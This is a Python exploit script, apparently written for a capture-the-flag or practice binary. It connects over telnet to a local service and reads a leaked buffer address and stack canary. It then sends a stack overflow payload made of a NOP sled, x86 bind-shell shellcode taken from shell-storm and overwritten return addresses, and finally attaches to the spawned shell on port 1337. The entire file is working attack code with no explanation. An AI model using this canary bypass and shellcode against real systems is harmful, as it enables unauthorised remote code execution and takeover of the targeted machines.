#! python3

from telnetlib import Telnet

import time
import struct



HOST = 'localhost'
PORT = '31338'

S_PORT = '1337'

def p32(addr):
    return struct.pack('<I', addr)

def up32(addr):
    return struct.unpack('<I', addr)[0]

def shell():
    tn2 = Telnet(HOST, S_PORT)
    tn2.interact()

def exploit(conn):
    
    
    # http://shell-storm.org/shellcode/files/shellcode-882.php
    shellcode = b'\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80'
    
    sock = conn.get_socket()
    ptr_buf = up32(sock.recv(4))
    val_rand = up32(sock.recv(4))

    print('ptr_buf\t: {}'.format(hex(ptr_buf)))
    print('rand\t: {}'.format(hex(val_rand)))
    
    buf_size = 0x810 - 0x11 + 1
    print(buf_size)

    payload = b'\x90' * 0x500 + shellcode
    payload += b'\x90' * (buf_size - len(payload))
    payload += p32(val_rand)
    payload += b'\x90'*12
    payload += p32(ptr_buf + 0x40) * 20

    input('gdb?')

    sock.send(payload + b'\n')

    time.sleep(1)
    
    
    shell()
    
def main():
    tn = Telnet(HOST, PORT)
    exploit(tn)
    
if __name__ == '__main__':
    main()
